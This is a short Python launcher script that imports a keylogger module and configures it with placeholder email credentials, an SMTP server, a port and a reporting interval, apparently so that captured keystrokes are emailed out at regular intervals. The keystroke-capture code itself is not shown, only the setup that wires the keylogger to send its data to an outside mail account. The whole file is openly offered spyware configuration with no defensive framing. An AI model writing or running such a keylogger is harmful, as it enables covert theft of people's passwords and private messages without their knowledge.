#!/usr/bin/env python
import keylogger


email = "set your email"
password = "set your password"
interval = 0    #set your time interval. eg. 120 for 2 minutes.
smtp = "set your smtp server"
smtp_port = 0   #set your smtp port number. eg. 587 for smtp.gmail.com


my_keylogger = keylogger.Keylogger(int(interval), email, password, smtp, smtp_port)

